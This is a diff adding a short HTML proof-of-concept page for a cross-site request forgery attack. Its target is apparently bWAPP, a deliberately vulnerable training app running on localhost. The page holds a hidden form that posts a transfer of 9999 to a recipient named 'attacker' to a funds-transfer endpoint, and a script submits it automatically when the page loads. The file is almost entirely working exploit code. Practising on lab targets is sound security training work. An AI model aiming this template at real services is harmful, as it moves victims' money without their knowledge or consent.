@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack PoC</title>
+</head>
+<body>
+  <h2>CSRF Proof of Concept</h2>
+  <form action="http://localhost/bWAPP/transfer_funds.php" method="POST" id="csrfForm">
+    <input type="hidden" name="amount" value="9999">
+    <input type="hidden" name="recipient" value="attacker">
+  </form>
+  <script>
+    // Auto-submit the form when the page loads
+    window.onload = function() {
+      document.getElementById('csrfForm').submit();
+    };
+  </script>
+</body>
+</html>
